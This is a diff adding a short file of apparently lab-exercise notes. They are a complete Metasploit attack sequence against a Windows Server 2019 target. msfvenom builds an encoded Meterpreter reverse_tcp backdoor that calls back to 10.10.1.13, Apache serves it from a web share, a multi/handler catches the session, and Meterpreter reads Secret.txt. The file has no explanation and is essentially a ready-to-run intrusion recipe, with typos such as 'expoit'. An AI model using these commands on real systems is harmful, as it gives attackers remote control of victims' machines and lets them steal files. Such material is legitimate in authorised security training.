@@ -1,0 +1,21 @@
+Windows Server 2019:
+service postgresql start
+msfvenom -p windows/meterpreter/reverse_tcp –platform windows -a x86 LHOST=10.10.1.13  -e x86/shikata_ga_nai -b “\x00” -f exe > home/attacker/Desktop/backdoor.exe
+
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+cp home/attacker/Desktop/backdoor.exe /var/www/html/share
+
+service apache2 start
+
+msfconsole
+use expoit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.1.13
+exploit -j -z 
+
+sessions -i 1
+meterpreter> sysinfo
+meterpreter> pwd
+meterpreter> cat Secret.txt
